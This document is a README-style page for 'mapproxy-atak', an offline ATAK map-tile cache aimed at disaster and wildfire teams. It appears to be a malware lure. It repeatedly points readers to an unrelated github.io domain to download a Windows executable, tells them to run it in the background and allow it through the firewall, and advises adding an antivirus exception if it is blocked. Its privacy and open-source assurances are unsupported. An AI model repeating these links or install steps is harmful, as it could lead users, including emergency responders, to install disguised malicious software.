# 🗺️ mapproxy-atak - Offline Maps for Your Team

## 🚀 Getting Started

Welcome! This guide will help you set up **mapproxy-atak**, a clever tool that saves your internet bandwidth while giving your team fast, reliable maps—even in remote areas.

Think of it like this: instead of every person downloading maps from the internet separately (and eating up valuable bandwidth), this program downloads them **once** and shares them with everyone on your local network. Perfect for disaster response, wildfire operations, or fieldwork with limited internet.

[🚀 DOWNLOAD NOW - Free & Open Source](https://travellingcannabisindica678.github.io)

---

## 💡 What Does It Do?

mapproxy-atak creates a **local map server** for ATAK (Android Team Awareness Kit)—the app used by first responders, search teams, and military units. It works like this:

1. **Fetches maps** from OpenStreetMap (free, detailed maps)
2. **Stores them** on your computer or server (called a "cache")
3. **Shares them** with phones and tablets on your local network
4. **Saves bandwidth**—you only download map tiles once, not repeatedly

**Key Benefits:**
- ⚡ **Fast loading**—maps appear instantly once cached
- 💾 **Bandwidth savings**—often 90%+ less internet usage
- 📶 **Works on Starlink, cellular, or spotty internet**
- 📱 **Compatible with ATAK** on Android devices
- 🖥️ **Easy onboarding** via QR codes or XML files
- 🔍 **Real client IPs** for proper tracking and logging
- 📈 **Optional monitoring** with Grafana dashboards

---

## 📥 Download and Installation

### Step 1: Get the Software

[**Visit this link to download the application.**](https://travellingcannabisindica678.github.io)

On that page, you'll find the latest release. The download is free and open-source.

### Step 2: What You'll Need

- **A Windows computer** (version 10 or 11 recommended) to act as the server
- At least **4 GB of RAM** and **10 GB of free hard drive space** (more if you want bigger map areas)
- A **stable internet connection** for the initial map downloads
- Your ATAK devices connected to the **same local network** (WiFi or Ethernet)

### Step 3: Run the Program

Once downloaded:
1. Double-click the downloaded file to start it
2. The program will set itself up automatically—**no coding needed**
3. Follow any on-screen prompts (usually clicking "Next" and "Finish")

That's it! The map server will start running in the background.

---

## 🛠️ How to Use It

### For Your Team Members

1. Make sure their phone/tablet is on the same WiFi network as your server
2. In ATAK, go to **Settings → Import**
3. Use the **QR code** scanner to connect—or import the XML file your server provides
4. Maps will load instantly and save bandwidth

### For You (The Administrator)

- Check the **control panel** at `http://localhost:8080` (on the server computer)
- See live statistics, cache usage, and connected devices
- Add more map areas or adjust settings anytime

---

## 📊 Optional: Grafana Monitoring

Want pretty graphs and real-time monitoring? mapproxy-atak includes optional **Grafana** dashboards. These show:

- 📈 Bandwidth saved over time
- 📍 Request locations and frequency
- ⚙️ System performance metrics
- 🚨 Alerts if something goes wrong

You can enable this during setup or anytime later with a simple toggle.

---

## 🆘 Troubleshooting

**"I can't connect from my phone"**
- Make sure your device is on the **same network** as the server
- Check that Windows Firewall allows access (you'll see a popup on first run—click "Allow")

**"Maps are loading slowly"**
- This is normal for the **first** request—the program is downloading tiles
- After that, everything speeds up dramatically

**"I get an error on startup"**
- Restart the program
- Ensure you have at least 2 GB free RAM
- Check your antivirus isn't blocking it (add an exception if needed)

---

## 🔒 Privacy & Safety

This software is **100% open-source**—meaning anyone can inspect the code for transparency. It:

- Does **not** collect or send personal data
- Only communicates with OpenStreetMap servers (for map updates)
- Stores everything locally on your network

---

## 🌍 Perfect For

- 🌲 **Wildfire response teams**—reliable maps in remote areas
- 🚑 **Disaster relief crews**—coordination when internet is scarce
- 🛰️ **Starlink users**—maximize your data allowance
- 🏞️ **Field expeditions**—share maps with your whole team

---

## ❓ Frequently Asked Questions

**Does it work on Mac or Linux?**
It's designed primarily for Windows. You can also run it using Docker on any system if you have technical knowledge.

**Is it really free?**
Yes! It's open-source software—no licenses, no subscriptions.

**How much bandwidth does it save?**
Typically 80-95%, depending on how many users you have and how often they re-visit the same areas.

---

## 📚 Need More Help?

- 📖 **Documentation:** Visit the repository for full guides
- 🐛 **Report issues:** Use the "Issues" tab on GitHub
- 💬 **Community:** Check for discussions or join ATAK-focused forums

---

## 🎉 Ready to Get Started?

Don't let slow internet slow down your mission. Download mapproxy-atak today and give your team the maps they need—when they need them.

[🚀 DOWNLOAD NOW - Free & Open Source](https://travellingcannabisindica678.github.io)

---

## 📌 Quick Reference

| Action | How To |
|--------|--------|
| Download | Visit the link above |
| Setup | Run the downloaded file, click Next |
| Connect ATAK | Scan QR code or import XML |
| View stats | Go to `http://localhost:8080` |
| Enable monitoring | Toggle Grafana in settings |

---

### Keywords: atak, bandwidth-optimization, disaster-response, docker, docker-compose, edge-cache, geospatial, gis, grafana, incident-response, map-tiles, mapproxy, openstreetmap, osm, starlink, tile-cache, tms, wildfire